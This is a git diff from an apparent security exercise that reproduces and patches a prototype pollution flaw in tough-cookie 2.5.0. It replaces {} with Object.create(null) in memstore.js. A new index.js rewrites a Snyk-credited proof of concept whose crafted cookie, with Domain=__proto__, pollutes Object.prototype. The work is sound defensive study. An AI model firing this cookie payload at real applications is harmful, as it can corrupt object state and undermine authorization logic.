@@ -1,0 +1,197 @@
+diff --git a/.idea/vcs.xml b/.idea/vcs.xml
+new file mode 100644
+index 0000000..94a25f7
+--- /dev/null
++++ b/.idea/vcs.xml
+@@ -0,0 +1,6 @@
++<?xml version="1.0" encoding="UTF-8"?>
++<project version="4">
++  <component name="VcsDirectoryMappings">
++    <mapping directory="$PROJECT_DIR$" vcs="Git" />
++  </component>
++</project>
+\ No newline at end of file
+diff --git a/250 Patched/lib/memstore.js b/250 Patched/lib/memstore.js
+index d2b915c..f28eb4f 100644
+--- a/250 Patched/lib/memstore.js	
++++ b/250 Patched/lib/memstore.js	
+@@ -28,6 +28,11 @@
+  * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+  * POSSIBILITY OF SUCH DAMAGE.
+  */
++
++/// Patch: Per the issue tracking notes and the patch changes,
++// in order to patch this vulnerability, we need to store the cookies
++// in a dictionary or creating an idx variable.
++// We will try this approach for starters.
+ 'use strict';
+ var Store = require('./store').Store;
+ var permuteDomain = require('./permuteDomain').permuteDomain;
+@@ -36,7 +41,7 @@ var util = require('util');
+ 
+ function MemoryCookieStore() {
+   Store.call(this);
+-  this.idx = {};
++  this.idx = Object.create(null);
+ }
+ util.inherits(MemoryCookieStore, Store);
+ exports.MemoryCookieStore = MemoryCookieStore;
+@@ -115,10 +120,10 @@ MemoryCookieStore.prototype.findCookies = function(domain, path, cb) {
+ 
+ MemoryCookieStore.prototype.putCookie = function(cookie, cb) {
+   if (!this.idx[cookie.domain]) {
+-    this.idx[cookie.domain] = {};
++    this.idx[cookie.domain] = Object.create(null);
+   }
+   if (!this.idx[cookie.domain][cookie.path]) {
+-    this.idx[cookie.domain][cookie.path] = {};
++    this.idx[cookie.domain][cookie.path] = Object.create(null);
+   }
+   this.idx[cookie.domain][cookie.path][cookie.key] = cookie;
+   cb(null);
+@@ -150,7 +155,7 @@ MemoryCookieStore.prototype.removeCookies = function(domain, path, cb) {
+ };
+ 
+ MemoryCookieStore.prototype.removeAllCookies = function(cb) {
+-  this.idx = {};
++  this.idx = Object.create(null);
+   return cb(null);
+ }
+ 
+diff --git a/PoC.js b/PoC.js
+deleted file mode 100644
+index 50353dd..0000000
+--- a/PoC.js
++++ /dev/null
+@@ -1,24 +0,0 @@
+-// Courtesy of: Snyk -
+-// https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873
+-
+-// PoC.js
+-async function main(){
+-    var tough = require("tough-cookie");
+-    var cookiejar = new tough.CookieJar(undefined,{rejectPublicSuffixes:false});
+-// Exploit cookie
+-    await cookiejar.setCookie(
+-        "Slonser=polluted; Domain=__proto__; Path=/notauth",
+-        "https://__proto__/admin"
+-    );
+-// normal cookie
+-    var cookie = await cookiejar.setCookie(
+-        "Auth=Lol; Domain=google.com; Path=/notauth",
+-        "https://google.com/"
+-    );
+-
+-//Exploit cookie
+-    var a = {};
+-    console.log(a["/notauth"]["Slonser"])
+-}
+-main();
+-
+diff --git a/index.js b/index.js
+new file mode 100644
+index 0000000..469b42c
+--- /dev/null
++++ b/index.js
+@@ -0,0 +1,47 @@
++async function main() {
++    try {
++        console.log("Creating a new cookie jar...");
++        var tough = require("tough-cookie");
++        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });
++
++        console.log("Setting a normal cookie...");
++        await new Promise((resolve, reject) => {
++            cookiejar.setCookie(
++                "Auth=Lol; Domain=google.com; Path=/notauth",
++                "https://google.com/",
++                { loose: true },
++                (err, cookie) => {
++                    if (err) {
++                        reject(err);
++                    } else {
++                        resolve(cookie);
++                    }
++                }
++            );
++        });
++
++        console.log("Setting an exploit cookie...");
++        await new Promise((resolve, reject) => {
++            cookiejar.setCookie(
++                "Slonser=polluted; Domain=__proto__; Path=/notauth",
++                "https://__proto__/admin",
++                { loose: true },
++                (err, cookie) => {
++                    if (err) {
++                        reject(err);
++                    } else {
++                        resolve(cookie);
++                    }
++                }
++            );
++        });
++
++        console.log("Trying to access the exploit cookie...");
++        var a = {};
++        console.log(a["/notauth"]["Slonser"]);
++    } catch (error) {
++        console.error("Error:", error);
++    }
++}
++
++main();
+diff --git a/package-lock.json b/package-lock.json
+new file mode 100644
+index 0000000..c4ef5db
+--- /dev/null
++++ b/package-lock.json
+@@ -0,0 +1,37 @@
++{
++  "name": "seal_security_project",
++  "lockfileVersion": 3,
++  "requires": true,
++  "packages": {
++    "": {
++      "dependencies": {
++        "tough-cookie": "^2.5.0"
++      }
++    },
++    "node_modules/psl": {
++      "version": "1.9.0",
++      "resolved": "https://registry.npmjs.org/psl/-/psl-1.9.0.tgz",
++      "integrity": "sha512-E/ZsdU4HLs/68gYzgGTkMicWTLPdAftJLfJFlLUAAKZGkStNU72sZjT66SnMDVOfOWY/YAoiD7Jxa9iHvngcag=="
++    },
++    "node_modules/punycode": {
++      "version": "2.3.1",
++      "resolved": "https://registry.npmjs.org/punycode/-/punycode-2.3.1.tgz",
++      "integrity": "sha512-vYt7UD1U9Wg6138shLtLOvdAu+8DsC/ilFtEVHcH+wydcSpNE20AfSOduf6MkRFahL5FY7X1oU7nKVZFtfq8Fg==",
++      "engines": {
++        "node": ">=6"
++      }
++    },
++    "node_modules/tough-cookie": {
++      "version": "2.5.0",
++      "resolved": "https://registry.npmjs.org/tough-cookie/-/tough-cookie-2.5.0.tgz",
++      "integrity": "sha512-nlLsUzgm1kfLXSXfRZMc1KLAugd4hqJHDTvc2hDIwS3mZAfMEuMbc03SujMF+GEcpaX/qboeycw6iO8JwVv2+g==",
++      "dependencies": {
++        "psl": "^1.1.28",
++        "punycode": "^2.1.1"
++      },
++      "engines": {
++        "node": ">=0.8"
++      }
++    }
++  }
++}
+diff --git a/package.json b/package.json
+new file mode 100644
+index 0000000..69a89e1
+--- /dev/null
++++ b/package.json
+@@ -0,0 +1,5 @@
++{
++  "dependencies": {
++    "tough-cookie": "^2.5.0"
++  }
++}
